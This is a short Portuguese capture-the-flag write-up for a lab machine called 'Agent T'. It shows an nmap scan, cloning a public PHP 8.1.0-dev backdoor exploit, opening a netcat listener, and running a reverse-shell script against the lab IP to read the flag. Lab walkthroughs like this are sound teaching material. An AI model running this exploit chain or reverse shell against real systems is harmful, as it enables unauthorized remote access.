# Agent T

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
nmap -A 10.10.125.232
```
![image](https://github.com/lufffe/Writeups/assets/90646635/4ffd53a3-4aa8-4251-b3d7-1a1cba6927ce)

* ### Pesquisando Exploit para o php que está rodando.
![image](https://github.com/lufffe/Writeups/assets/90646635/6180863d-d4ff-470d-aded-59688e95986f)

```bash
git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce.git
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6dd0bcb1-8349-4eb5-93b6-993bea677430)

* ### Pegando uma Reverse Shell.
```bash
nc -lnvp 4455
```
![image](https://github.com/lufffe/Writeups/assets/90646635/1e0188e6-ac79-475e-89c7-cc1e5afef8bf)

```bash
python revshell_php_8.1.0-dev.py  http://10.10.125.232 [SEU IP] 4455
```
![image](https://github.com/lufffe/Writeups/assets/90646635/3759dfec-d3a5-4cbe-81aa-0c1e44aaa902)

* ### Lendo Flag.
```bash
cat /flag.txt
```
